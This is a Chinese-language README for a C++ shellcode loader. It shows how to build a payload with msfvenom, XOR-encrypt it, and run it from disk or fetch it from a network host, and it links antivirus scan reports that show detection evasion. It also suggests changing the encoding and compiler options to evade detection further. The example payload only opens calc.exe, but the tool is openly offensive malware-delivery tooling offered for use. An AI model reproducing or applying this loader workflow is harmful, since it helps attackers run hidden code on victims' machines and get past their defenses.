# cpploader

shellcode 内存加载器 C++编写.

## usage

生成 payload

```
msfvenom -p windows/exec CMD=calc.exe -f raw -o calc.bin
```

加密 payload (默认 xor)

```
cppencoder.exe calc.bin enc.bin
```

`cpploader` 本地执行.

```
cpploader.exe enc.bin
```

`cppnerloader` 网络执行.

```
cppnetloader.exe 192.168.1.1 5555
```

## report

在线杀软扫描报告.

`cpploader`

[VirScan](http://r.virscan.org/language/zh-cn/report/d968bcfa2e2d9e1e29bf45c95c51f60f)

[VirusTotal](https://www.virustotal.com/gui/file/a56d0da8784f1ec01c354e7a0cfd2d004b36b509c266d344b25b2c5e7d458066/detection)

`cppnetloader`

[VirScan](http://r.virscan.org/language/zh-cn/report/092783011de845c8595b0d1ce5b56b8e)

[VirusTotal](https://www.virustotal.com/gui/file/992011c67059117a832b3e6cf7c16226046d42673f72d90cbf28aa18ab5a0ee5/detection)

# other

[C++ ShellCode 加载器](https://exp10it.cn/#/posts/64)

编码/加密方式可自行发挥.

更改 vs 编译选项缩小体积.

自己写效果更好.


